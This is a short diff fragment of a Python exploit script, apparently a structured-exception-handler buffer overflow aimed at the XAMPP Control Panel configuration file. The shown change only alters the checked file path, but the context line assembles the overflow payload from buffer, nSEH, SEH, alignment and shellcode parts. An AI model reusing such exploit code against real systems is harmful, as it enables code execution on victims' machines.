@@ -63,7 +63,7 @@ shellcode = (
 shellcode = buffer + nseh + seh +  eax_align + padd + shellcode
 
 
-check_file = os.path.isfile("c:\\xampp\\xampp-control.ini")
+check_file = os.path.isfile("c:\\xampp\\xampp-control.ini.bak")
 
 if check_file:
     
